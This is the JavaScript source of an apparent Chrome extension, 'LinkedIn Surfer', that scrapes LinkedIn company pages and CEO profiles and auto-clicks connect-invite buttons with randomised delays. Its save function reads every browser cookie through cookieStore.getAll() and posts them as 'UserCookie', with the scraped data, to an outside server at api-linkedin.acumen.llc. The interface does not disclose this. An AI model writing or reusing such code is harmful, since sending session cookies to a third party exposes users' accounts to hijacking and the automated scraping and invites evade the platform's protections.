const fetchdata = function (url, apipath, method, data) {
  return fetch(url + apipath, {
    method: method,
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  });
};

var url = "";
const todoresp = { todo: "showPageAction" };
chrome.runtime.sendMessage(todoresp);
main();

function main() {
  const sliderInnerHTMLString = generateSliderHTML();
  sliderGen(sliderInnerHTMLString);

  chrome.runtime.onMessage.addListener((msg) => {
    if (msg.todo === "toggle") {
      slider();
    }
  });

  document.getElementById("clear_text_button").addEventListener("click", clearTextFields);
  document.getElementById("Url_extract_button").addEventListener("click", async () => {
    document.getElementById("CompanyUrl").value = JSON.stringify(await extract());
  });
  document.getElementById("skills_extract_button").addEventListener("click", scrapeAllPages);
  document.getElementById("send_request").addEventListener("click", send_request);
  document.getElementById("save_profile_data_button").addEventListener("click", saveProfileData);
}

function generateSliderHTML() {
  return `<!-- HEADER IS HERE -->
    <div id='header'>
        <img src='https://acumen.llc/Software-Companies-Mumbai-India-Images/Acumen-logo-tb.png' alt='Logo'/>
        <h1>LinkedIn Surfer</h1>
    </div>
    <div class='internal_button sticky_buttons' id='clear_text_button'>Clear Text?</div>
    <br/>
    <div id='inputSection'>
        <label for='inputDescription'>Input Description: </label>
        <input type='text' id='inputDescription' placeholder='Enter description'/>
        <br/>
        <label for='pageLimit'>Page Limit: </label>
        <input type='number' id='pageLimit' placeholder='Enter page limit' value='5'/>
    </div>
    <!-- THE BODY CONTAINER IS HERE -->
    <div id='sbodycontainer'>
        <br/>
        <br/>
        <span style='font-size: 10px'><i> </i></small>
        <textarea id='CompanyUrl'></textarea>
        <br/>
        <div class='internal_button' id='skills_extract_button'>Save All Pages</div>
        <div class='internal_button' id='Url_extract_button'>Extract Current Page</div>
        <div class='internal' id='send_request'>Send request </div>
    </div>
    <!-- THE FOOTER IS HERE -->
    <div id='sfooter'><hr/>
        <div class='internal_button' id='save_profile_data_button'>Save Extracted Links</div>
    </div>`;
}

function clearTextFields() {
  const ids = ["CompanyUrl"];
  ids.forEach(id => {
    document.getElementById(id).value = "";
  });
}

async function send_request() {
  console.log("request sent");
  sendConnectRequest(window);
}

function getDescription() {
  const inputDescription = document.getElementById("inputDescription").value;
  if (inputDescription.trim() === "") {
    alert("Description cannot be empty");
    return "";
  }
  return inputDescription;
}

async function readCookies() {
  return await cookieStore.getAll();
}

async function saveProfileData() {
  const description = getDescription();
  if (description === "") return;

  const textBoxIds = ["CompanyUrl"];
  const profileData = textBoxIds.reduce((data, id) => {
    const key = id.includes("text") ? id.replace("text", "") : id;
    data[key] = document.getElementById(id).value || "No data";
    return data;
  }, {});

  const filename = prompt("Enter file Name:");
  const data = new Blob([JSON.stringify(profileData)], { type: "application/json" });
  const url = URL.createObjectURL(data);
  const a = document.createElement("a");
  a.href = url;
  a.download = `${filename}.txt`;
  document.body.appendChild(a);
  a.click();

  setTimeout(() => {
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }, 0);

  const cookies = await readCookies();
  const requestData = { Url: profileData.CompanyUrl, Desc: description, UserCookie: cookies };
  const apiUrl = "https://api-linkedin.acumen.llc/linkedinrls";

  await fetchdata(apiUrl, "", "POST", requestData);
}

function sliderGen(sliderInnerHTMLString) {
  const slider = document.createElement("div");
  slider.id = "slider";
  slider.innerHTML += sliderInnerHTMLString;
  document.body.prepend(slider);
}

function slider() {
  const slider = document.getElementById("slider");
  slider.style.width = slider.style.width === "0px" ? "400px" : "0px";
}

async function extractCompanyInfo() {
  const info = {};

  const titleElement = document.querySelector(".org-top-card__primary-content h1");
  if (titleElement) info.name = titleElement.innerText.trim();

  const overviewElement = document.querySelector(".org-page-details-module__card-spacing p");
  if (overviewElement) info.overview = overviewElement.innerText.trim();

  const websiteElement = document.querySelector('a[rel="noopener noreferrer"]');
  if (websiteElement) info.website = websiteElement.href;

  const details = ["Industry", "Company size", "Headquarters", "Founded", "Specialties"];
  details.forEach(detail => {
    const value = getTextNextToDt(detail);
    if (value) info[detail.toLowerCase().replace(" ", "")] = value;
  });

  const locationElements = document.querySelectorAll(".org-location-card p");
  if (locationElements) {
    info.locations = Array.from(locationElements).map(location => location.innerText.trim());
  }

  return info;
}

function getTextNextToDt(dtText) {
  const dtElements = document.querySelectorAll("dt");
  for (let dt of dtElements) {
    if (dt.innerText.trim() === dtText) {
      const nextDd = dt.nextElementSibling;
      if (nextDd && nextDd.tagName === "DD") {
        return nextDd.innerText.trim();
      }
    }
  }
  return null;
}

function findConnectButton(profileTab) {
  return profileTab.document.querySelector("[aria-label^='Invite']");
}

function simulateClick(element, minDelay, maxDelay) {
  const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
  setTimeout(() => {
    element.dispatchEvent(new MouseEvent("mousedown"));
    setTimeout(() => {
      element.dispatchEvent(new MouseEvent("mouseup"));
    }, 10);
  }, delay);
}

function sendConnectRequest(profileTab, callback) {
  const connectButton = findConnectButton(profileTab);
  if (connectButton) {
    connectButton.click();
    simulateClick(connectButton, 1000, 2000);
    if (callback) callback();
  } else {
    console.log("Connect button not found.");
    if (callback) callback();
  }
}

function waitForDialog(profileTab, timeout = 3000) {
  return new Promise((resolve, reject) => {
    const interval = setInterval(() => {
      const dialog = profileTab.document.querySelector('.send-invite[role="dialog"]');
      if (dialog) {
        clearInterval(interval);
        resolve();
      }
    }, 100);
    setTimeout(() => {
      clearInterval(interval);
      reject(new Error("Dialog box not found within timeout"));
    }, timeout);
  });
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function extractCompanyInfoFromLink(link, companyInfo) {
  try {
    const companyTab = window.open(link + "about/", "_blank");
    await waitForLoad(companyTab);

    companyTab.scrollTo(0, companyTab.document.body.scrollHeight);
    await sleep(2000);

    const companyData = await companyTab.extractCompanyInfo();
    companyTab.close();

    const peopleTab = window.open(link + "people/?keywords=ceo", "_blank");
    await waitForLoad(peopleTab);

    peopleTab.scrollTo(0, peopleTab.document.body.scrollHeight);
    await sleep(2000);

    const profileLink = peopleTab.document.querySelector(".org-people-profile-card__profile-info a.app-aware-link");
    if (profileLink) {
      const profileTab = window.open(profileLink.href, "_blank");
      await waitForLoad(profileTab);

      profileTab.scrollTo(0, profileTab.document.body.scrollHeight);
      await sleep(2000);

      const aboutSection = profileTab.document.querySelector('section.artdeco-card[data-view-name="profile-card"]');
      const aboutText = aboutSection ? aboutSection.querySelector('.inline-show-more-text--is-collapsed span[aria-hidden="true"]').textContent.trim() : "";

      profileTab.close();
      companyInfo.push({ ...companyData, ceoProfile: profileLink.href, ceoAbout: aboutText });

      await fetchdata("http://localhost:3000", "/message", "POST", companyInfo[companyInfo.length - 1]);
      await fetchdata("http://localhost:3000", "/sendInvite", "POST", { ceoProfile: profileLink.href });

    } else {
      companyInfo.push(companyData);
    }
    peopleTab.close();
  } catch (error) {
    console.error("An error occurred:", error);
  }
}

function waitForLoad(tab) {
  return new Promise((resolve, reject) => {
    tab.addEventListener("load", () => resolve());
    tab.addEventListener("error", error => reject(error));
  });
}

async function extract() {
  const appAwareLinks = document.querySelectorAll(".scaffold-layout__main .entity-result__title-text .app-aware-link");
  const companyInfo = [];

  for (let link of appAwareLinks) {
    const hrefValue = link.getAttribute("href");
    await extractCompanyInfoFromLink(hrefValue, companyInfo);
  }

  return companyInfo;
}

async function scrapeAllPages() {
  const description = getDescription();
  if (description === "") return;

  const allData = [];
  let pageCount = 1;
  const pageLimit = parseInt(document.getElementById("pageLimit").value, 10);

  async function goToNextPage() {
    window.scrollTo(0, document.body.scrollHeight);

    setTimeout(async () => {
      if (pageCount < pageLimit) {
        const nextPageButton = document.querySelector(".artdeco-pagination__button--next .artdeco-button__text");
        if (nextPageButton) {
          nextPageButton.click();
          pageCount++;
          setTimeout(scrapeCurrentPage, 1000);
        } else {
          completeScraping();
        }
      } else {
        completeScraping();
      }
    }, 3000);
  }

  function completeScraping() {
    document.getElementById("CompanyUrl").value = JSON.stringify(allData);
    saveProfileData(allData);

    const url = "https://api-linkedin.acumen.llc/linkedinrls";
    try {
      fetchdata(url, "", "POST", allData);
    } catch (error) {
      console.error("Error posting data:", error);
    }
  }

  async function scrapeCurrentPage() {
    const currentPageData = await extract();
    allData.push(...currentPageData);
    goToNextPage();
  }

  scrapeCurrentPage();
  return allData;
}
